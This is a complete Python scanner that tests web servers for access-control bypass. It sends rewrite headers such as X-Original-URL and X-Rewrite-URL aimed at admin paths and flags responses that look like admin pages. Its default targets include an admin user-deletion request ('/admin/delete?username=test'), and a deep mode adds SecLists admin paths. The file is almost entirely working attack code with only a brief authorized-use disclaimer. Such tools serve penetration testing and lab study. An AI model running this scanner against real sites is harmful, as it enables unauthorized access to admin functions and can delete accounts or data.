#!/usr/bin/env python3
"""
xoverride_single.py

Single-file modular X-Override scanner (class-based), optimized for low false-positives.
Usage:
  python3 xoverride_single.py -u example.com [--deep] [--post-data "u=p&p=q"] [--cookie "session=..."] [--max 500] [--insecure]

Note: Use only on authorized targets (labs / your infrastructure).
"""
import argparse
import requests
import os
import re
import sys
import hashlib
import json
from urllib.parse import urljoin, urlparse
from difflib import SequenceMatcher
from collections import defaultdict
from pathlib import Path
import time

# ------------------ Config ------------------
SECLISTS_DIR_DEFAULT = "/usr/share/seclists/Discovery/Web-Content"
HEADER_VARIANTS = [
    "X-Original-URL","X-Original-Url","X-Original-URI","X-Original-Uri",
    "X-Rewrite-URL","X-Rewrite-Url","X-Override-URL",
    "X-Forwarded-Host","X-Forwarded-For","X-Forwarded-Proto",
    "X-HTTP-Method-Override","X-Requested-With"
]
ADMIN_KEYWORDS = ["admin","administrator","panel","dashboard","manage","delete","settings","login","user","users","csrf","token"]
DEFAULT_BASELINE_PATHS = ["/", "/index", "/home", "/login"]
DEFAULT_OVERRIDE_TARGETS = ["/admin","/admin/delete","/admin/delete?username=test"]

# thresholds
SIMILARITY_THRESHOLD = 0.85   # if candidate similar to baseline > this -> likely same page
ADMIN_KEYWORD_COUNT_THRESHOLD = 2  # number of admin keywords required to consider admin page
LEN_DIFF_MIN = 50  # minimal body length diff to consider significant

# ------------------ Utilities ------------------
def normalize_path(p):
    if not p: return None
    p = p.strip()
    if "://" in p:
        try:
            p = urlparse(p).path or "/"
        except:
            pass
    p = p.replace("\\","/")
    p = re.sub(r"/+", "/", p)
    if not p.startswith("/"): p = "/" + p
    if p != "/" and p.endswith("/"): p = p.rstrip("/")
    return p

def extract_title(html):
    if not html:
        return ""
    m = re.search(r"<title[^>]*>(.*?)</title>", html, re.I | re.S)
    if m:
        return m.group(1).strip()
    return ""

def sha256(text):
    if text is None: return ""
    return hashlib.sha256(text.encode("utf-8", errors="ignore")).hexdigest()

def similarity(a, b):
    return SequenceMatcher(None, a, b).ratio()

def short_snippet(text, n=200):
    if not text: return ""
    return re.sub(r"\s+", " ", text)[:n]

# ------------------ Classes ------------------

class Requester:
    def __init__(self, verify=True, timeout=8, proxies=None):
        self.session = requests.Session()
        self.session.verify = verify
        self.session.headers.update({"User-Agent":"XOverrideSingle/1.0"})
        self.timeout = timeout
        if proxies:
            self.session.proxies.update(proxies)
        # requests by default uses env proxies; trust_env True uses them
        self.session.trust_env = True

    def get(self, url, headers=None, allow_redirects=False):
        try:
            r = self.session.get(url, headers=headers, allow_redirects=allow_redirects, timeout=self.timeout)
            return r
        except requests.RequestException as e:
            return None

    def post(self, url, headers=None, data=None, allow_redirects=False):
        try:
            r = self.session.post(url, headers=headers, data=data, allow_redirects=allow_redirects, timeout=self.timeout)
            return r
        except requests.RequestException:
            return None

class SecListsLoader:
    def __init__(self, base_dir=None, filter_keywords=None):
        self.base_dir = base_dir or SECLISTS_DIR_DEFAULT
        self.filter_keywords = filter_keywords or ["admin","panel","dashboard","manage","login","root","secure","private","console","adminer"]
        self.paths = []

    def discover(self, max_paths=2000):
        out = []
        if not os.path.isdir(self.base_dir):
            return out
        for root, dirs, files in os.walk(self.base_dir):
            for fname in files:
                full = os.path.join(root, fname)
                try:
                    with open(full, "r", errors="ignore") as fh:
                        for line in fh:
                            line=line.strip()
                            if not line or line.startswith("#"): continue
                            low=line.lower()
                            if not any(k in low for k in self.filter_keywords): continue
                            p = normalize_path(line)
                            if p:
                                out.append(p)
                except Exception:
                    continue
        # deduplicate preserving order
        seen=set(); clean=[]
        for p in out:
            if p not in seen:
                seen.add(p)
                clean.append(p)
            if len(clean) >= max_paths:
                break
        self.paths = clean
        return clean

class Analyzer:
    def __init__(self, baseline_map):
        """
        baseline_map: dict[path] = {"len":..., "hash":..., "title":..., "text":...}
        """
        self.baseline = baseline_map or {}

    def fingerprint_match(self, candidate_text):
        """Compare candidate against all baseline fingerprints. Return (matched_path, similarity) or (None,0)"""
        best = (None, 0.0)
        for p,b in self.baseline.items():
            sim = similarity(candidate_text or "", b.get("text","") or "")
            if sim > best[1]:
                best = (p, sim)
        return best

    def is_admin_like(self, text):
        if not text:
            return False, 0, []
        low = (text or "").lower()
        found=[]
        for k in ADMIN_KEYWORDS:
            if k in low:
                found.append(k)
        return (len(found) >= ADMIN_KEYWORD_COUNT_THRESHOLD), len(found), found

    def analyze(self, baseline_resp, candidate_resp):
        """
        baseline_resp and candidate_resp are requests.Response objects (or None).
        Returns dict: {interesting:bool, reasons:[...], severity: 'LOW'|'MEDIUM'|'HIGH'}
        """
        reasons=[]
        severity="LOW"
        if candidate_resp is None:
            return {"interesting":False, "reasons":["no candidate response"], "severity":severity}

        c_status = candidate_resp.status_code
        c_text = candidate_resp.text if candidate_resp.text else ""
        c_len = len(candidate_resp.content) if candidate_resp.content else 0
        c_title = extract_title(c_text)

        if baseline_resp is None:
            reasons.append("no baseline - candidate responded")
            severity="MEDIUM"
            # then further checks
        else:
            b_status = baseline_resp.status_code
            b_text = baseline_resp.text if baseline_resp.text else ""
            b_len = len(baseline_resp.content) if baseline_resp.content else 0
            b_title = extract_title(b_text)

            # status change
            if b_status != c_status:
                reasons.append(f"status changed {b_status} -> {c_status}")
                if b_status in (401,403,404) and c_status in (200,301,302):
                    severity="HIGH"
                else:
                    severity = "MEDIUM" if severity!="HIGH" else severity

            # title difference
            if b_title and c_title and b_title.strip().lower() != c_title.strip().lower():
                reasons.append(f"title changed: '{b_title}' -> '{c_title}'")
                severity = "MEDIUM" if severity!="HIGH" else severity

            # body length difference
            if abs(b_len - c_len) > max(LEN_DIFF_MIN, b_len//10 if b_len>0 else LEN_DIFF_MIN):
                reasons.append(f"body length changed ({b_len} -> {c_len})")
                severity = "MEDIUM" if severity!="HIGH" else severity

        # fingerprint (similarity to baseline)
        matched_path, sim = self.fingerprint_match(c_text)
        if matched_path and sim >= SIMILARITY_THRESHOLD:
            reasons.append(f"response very similar to baseline '{matched_path}' (sim={sim:.2f})")
            # similarity to baseline implies likely same page => reduce severity
            # if earlier high severity flagged, keep it but mark as suspicious
            if severity != "HIGH":
                severity = "LOW"
        # admin-like detection
        admin_like, count, found = self.is_admin_like(c_text)
        if admin_like:
            reasons.append(f"admin-like keywords found: {found}")
            # if similarity says same as baseline then don't bump high
            if severity=="LOW":
                severity="HIGH"
            elif severity=="MEDIUM":
                severity="HIGH"

        # redirect chain check
        # requests.Response.history is a list of Response objects if allow_redirects True
        # But we normally used allow_redirects=False; still candidate_resp might have .headers['Location']
        if 'Location' in candidate_resp.headers:
            reasons.append(f"Location header in candidate: {candidate_resp.headers.get('Location')}")
            severity = "MEDIUM" if severity!="HIGH" else severity

        interesting = any([
            ("status changed" in r) or ("admin-like" in r) or ("admin-like" in r)
            for r in reasons
        ]) or admin_like

        # Final rule: require at least two independent signals to mark HIGH:
        # signals: status_change, title_change, admin_keywords, body_len_change, location_change, not-similar-to-baseline
        signals = 0
        if any("status changed" in r for r in reasons): signals += 1
        if any(r.startswith("title changed") for r in reasons): signals += 1
        if admin_like: signals += 1
        if any("body length changed" in r for r in reasons): signals += 1
        if any(r.startswith("Location header") for r in reasons) or any("Location changed" in r for r in reasons): signals += 1
        # not similar to baseline:
        if not (matched_path and sim >= SIMILARITY_THRESHOLD):
            signals += 1

        # determine final severity
        if signals >= 3:
            final_sev = "HIGH"
        elif signals == 2:
            final_sev = "MEDIUM"
        else:
            final_sev = "LOW"

        # but if matched similarity to baseline strongly and no admin keywords, mark not interesting
        if matched_path and sim >= SIMILARITY_THRESHOLD and not admin_like and final_sev!="HIGH":
            return {"interesting": False, "reasons": ["response matches baseline closely; likely fallback"], "severity": "LOW"}

        return {"interesting": True if final_sev!="LOW" else False, "reasons": reasons, "severity": final_sev}

class Scanner:
    def __init__(self, target, post_data=None, cookie=None, insecure=False, deep=False, max_paths=200, timeout=8):
        self.raw_target = target
        if not (target.startswith("http://") or target.startswith("https://")):
            self.target_candidates = ["https://" + target, "http://" + target]
        else:
            self.target_candidates = [target]
        self.post_data = post_data
        self.cookie = cookie
        self.verify = not insecure
        self.deep = deep
        self.max_paths = max_paths
        self.req = Requester(verify=self.verify, timeout=timeout)
        self.secloader = SecListsLoader()
        self.baseline_map = {}
        self.analyzer = None
        self.findings = []
        self.seen_findings = set()
        self.override_targets = list(DEFAULT_OVERRIDE_TARGETS)
        self.headers_to_try = HEADER_VARIANTS

    def build_override_list(self):
        # extend override targets with sec lists (if deep)
        if self.deep:
            secl = self.secloader.discover(max_paths=self.max_paths*5)
            for p in secl:
                if p not in self.override_targets:
                    self.override_targets.append(p)
        # ensure normalized and unique
        norm=[]
        for p in self.override_targets:
            n = normalize_path(p)
            if n and n not in norm:
                norm.append(n)
        self.override_targets = norm

    def prepare_baselines(self, base_url):
        print("[*] Preparing baselines for:", base_url)
        self.baseline_map = {}
        headers = {}
        if self.cookie: headers["Cookie"]=self.cookie
        for p in DEFAULT_BASELINE_PATHS:
            url = urljoin(base_url, p.lstrip("/"))
            r = self.req.get(url, headers=headers, allow_redirects=False)
            if r is None:
                continue
            self.baseline_map[p] = {"len": len(r.content or b""), "hash": sha256(r.text or ""), "title": extract_title(r.text or ""), "text": r.text or ""}
            print(f"  baseline {p} -> status {r.status_code} len {len(r.content or b'')}")
        # build analyzer
        self.analyzer = Analyzer(self.baseline_map)

    def run_once(self, base_url):
        self.build_override_list()
        self.prepare_baselines(base_url)
        headers = {}
        if self.cookie: headers["Cookie"]=self.cookie

        # Use user-provided post_data to enable POST tests
        test_paths = ["/", "/login"]  # baseline paths to test overrides on
        for path in test_paths:
            target_url = urljoin(base_url, path.lstrip("/"))
            print(f"\n== Testing baseline path {path} on {base_url} ==")
            base_get = self.req.get(target_url, headers=headers, allow_redirects=False)
            base_post = None
            if self.post_data:
                base_post = self.req.post(target_url, headers=headers, data=self.post_data, allow_redirects=False)

            # iterate override headers and override targets
            for header in self.headers_to_try:
                for override in self.override_targets:
                    # skip identity
                    override_norm = normalize_path(override)
                    hdrs = dict(headers)
                    hdrs[header] = override_norm
                    # GET
                    rget = self.req.get(target_url, headers=hdrs, allow_redirects=False)
                    # analyze
                    res = self.analyzer.analyze(base_get, rget)
                    key = (header, "GET", override_norm, path)
                    if res.get("interesting"):
                        # dedup
                        keyid = "|".join(map(str,key))
                        if keyid not in self.seen_findings:
                            self.seen_findings.add(keyid)
                            self.findings.append({"header":header,"method":"GET","override":override_norm,"path":path,"severity":res["severity"],"reasons":res["reasons"],"candidate_len": (len(rget.content) if rget and rget.content else 0),"candidate_title": extract_title(rget.text if rget else "")})
                    # POST
                    if self.post_data:
                        rpost = self.req.post(target_url, headers=hdrs, data=self.post_data, allow_redirects=False)
                        res2 = self.analyzer.analyze(base_post, rpost)
                        key2 = (header, "POST", override_norm, path)
                        if res2.get("interesting"):
                            keyid2 = "|".join(map(str,key2))
                            if keyid2 not in self.seen_findings:
                                self.seen_findings.add(keyid2)
                                self.findings.append({"header":header,"method":"POST","override":override_norm,"path":path,"severity":res2["severity"],"reasons":res2["reasons"],"candidate_len": (len(rpost.content) if rpost and rpost.content else 0),"candidate_title": extract_title(rpost.text if rpost else "")})

    def run(self):
        for base in self.target_candidates:
            print(f"\n== Testing base: {base} ==")
            # quick reachability check
            r = self.req.get(base, headers=None, allow_redirects=False)
            if r is None:
                print("  [!] Base not reachable:", base)
                continue
            # prepare override list
            self.build_override_list()
            # run once per base
            self.run_once(base)
        # print summary
        print("\n[+] Scan complete. Findings:", len(self.findings))
        for f in self.findings:
            sev_col = f["severity"]
            print(f"[{sev_col}] {f['header']} {f['method']} -> {f['override']} on {f['path']}")
            for r in f["reasons"]:
                print("   -", r)

# ------------------ CLI ------------------
def parse_args():
    p = argparse.ArgumentParser(description="X-Override single-file modular scanner (low false positives). Use only on authorized targets.")
    p.add_argument("-u","--url", required=True, help="Target host or base url (example.com or https://example.com)")
    p.add_argument("--deep", action="store_true", help="Enable SecLists deep mode (optimized filter)")
    p.add_argument("--post-data", help="POST body to use (enable POST tests)")
    p.add_argument("--cookie", help="Cookie header to include")
    p.add_argument("--insecure", action="store_true", help="Disable TLS verification")
    p.add_argument("--max", type=int, default=300, help="Max SecLists paths to load (optimized)")
    p.add_argument("--timeout", type=int, default=8, help="Request timeout seconds")
    return p.parse_args()

def main():
    args = parse_args()
    # normalize
    target = args.url
    # create scanner
    sc = Scanner(target, post_data=args.post_data, cookie=args.cookie, insecure=args.insecure, deep=args.deep, max_paths=args.max, timeout=args.timeout)
    # set seclists dir to default or env override
    if args.deep:
        loader = sc.secloader
        if os.path.isdir(SECLISTS_DIR_DEFAULT):
            loader.base_dir = SECLISTS_DIR_DEFAULT
        else:
            # try common alternatives
            alt = "/usr/share/wordlists/seclists/Discovery/Web-Content"
            if os.path.isdir(alt):
                loader.base_dir = alt
    sc.run()

if __name__ == "__main__":
    main()
